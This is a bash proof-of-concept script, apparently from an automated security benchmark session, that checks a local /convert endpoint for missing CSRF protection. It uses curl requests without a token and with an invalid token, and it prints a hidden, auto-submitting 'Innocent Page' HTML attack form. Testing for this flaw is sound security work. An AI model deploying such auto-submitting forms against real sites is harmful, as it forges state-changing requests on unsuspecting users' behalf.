#!/bin/bash
# POC: Demonstrates missing CSRF protection on the /convert endpoint by submitting a POST request without any CSRF token
# Target: ./repo
# Created: 2025-11-04T20:06:54.732Z
# Session: benchmark-XBEN-033-24-mhkzvt57

# CSRF Protection Missing POC
# Demonstrates that the /convert endpoint accepts POST requests without CSRF token validation

echo "=== CSRF Protection Missing - POC Demonstration ==="
echo ""

# Step 1: Check the form at root endpoint
echo "[*] Step 1: Fetching root endpoint to check for CSRF token in form"
echo "[*] Command: curl -s http://localhost:8080/"
echo ""

FORM_RESPONSE=$(curl -s http://localhost:8080/)
echo "Response received. Checking for CSRF token field..."
echo ""

# Check if csrf_token is present in form
if echo "$FORM_RESPONSE" | grep -q "csrf_token"; then
    echo "[-] CSRF token field found in form (PROTECTED)"
else
    echo "[+] NO csrf_token field found in form (VULNERABLE)"
fi

if echo "$FORM_RESPONSE" | grep -q "csrf"; then
    echo "[-] Some CSRF-related content found"
else
    echo "[+] NO CSRF-related protections found anywhere in form"
fi

echo ""
echo "=== Form HTML (relevant sections) ==="
echo "$FORM_RESPONSE" | grep -A 10 "<form" | head -20
echo ""

# Step 2: Attempt POST request without CSRF token
echo "[*] Step 2: Submitting POST request to /convert WITHOUT CSRF token"
echo "[*] Command: curl -X POST -d 'markdown_text=test content' http://localhost:8080/convert"
echo ""

POST_RESPONSE=$(curl -s -X POST -d "markdown_text=test content" http://localhost:8080/convert)
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "markdown_text=test content" http://localhost:8080/convert)

echo "HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: POST request accepted WITHOUT CSRF token (HTTP 200)"
    echo "[+] Response preview:"
    echo "$POST_RESPONSE" | head -100
else
    echo "[-] POST request rejected (HTTP $HTTP_CODE) - CSRF protection may be present"
fi

echo ""
echo "=== CSRF Vulnerability Confirmation ==="
echo ""

# Step 3: Demonstrate CSRF attack vector
echo "[*] Step 3: Creating external CSRF attack form to show attack vector"
echo ""

CSRF_HTML_FORM="<html>
<head><title>Innocent Page</title></head>
<body onload='document.csrf_form.submit()'>
<h1>Loading...</h1>
<form id='csrf_form' action='http://localhost:8080/convert' method='POST' style='display:none'>
    <input type='hidden' name='markdown_text' value='Malicious content injected via CSRF attack'>
</form>
</body>
</html>"

echo "[+] Crafted CSRF attack form (would execute automatically on victim's browser):"
echo "$CSRF_HTML_FORM"
echo ""

# Step 4: Verify no token validation happens
echo "[*] Step 4: Attempting POST with random/invalid token field (to verify no validation)"
echo "[*] Command: curl -X POST -d 'markdown_text=test&csrf_token=invalid123' http://localhost:8080/convert"
echo ""

HTTP_CODE_WITH_INVALID=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "markdown_text=test&csrf_token=invalid123" http://localhost:8080/convert)

if [ "$HTTP_CODE_WITH_INVALID" = "200" ]; then
    echo "[+] VULNERABLE: Request accepted even with invalid CSRF token (HTTP 200)"
    echo "[+] Confirms NO CSRF token validation is performed"
else
    echo "[-] Request rejected with invalid token (HTTP $HTTP_CODE_WITH_INVALID)"
fi

echo ""
echo "=== CONCLUSION ==="
echo "[+] CSRF Protection is MISSING - Application is VULNERABLE"
echo "[+] POST requests to /convert are accepted without any CSRF token"
echo "[+] Attack vector confirmed: Malicious forms can submit state-changing requests"